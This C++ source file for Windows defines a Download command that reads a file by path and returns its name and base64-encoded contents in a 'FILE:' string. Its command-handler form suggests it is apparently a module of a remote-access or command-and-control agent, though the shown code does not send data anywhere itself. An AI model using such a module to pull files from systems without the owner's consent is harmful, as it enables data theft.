#include "Download.h"
#include "Helpers.h"
#include <sstream>

std::string Download(std::vector<std::string> arguments) {
    if (arguments.empty() || arguments[0].empty())
        return "Error: path required";

    std::string path = arguments[0];

    HANDLE hFile = CreateFileA(
        path.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
        return "Error: cannot open file";

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return "Error: cannot get file size";
    }

    std::string data(static_cast<size_t>(fileSize.QuadPart), '\0');
    DWORD bytesRead = 0;
    BOOL ok = ReadFile(hFile, &data[0], static_cast<DWORD>(fileSize.QuadPart), &bytesRead, NULL);
    CloseHandle(hFile);

    if (!ok)
        return "Error: cannot read file";

    data.resize(bytesRead);

    std::string filename = path;
    size_t pos = path.find_last_of("\\/");
    if (pos != std::string::npos)
        filename = path.substr(pos + 1);

    return "FILE:" + filename + ":" + base64_encode(data);
}
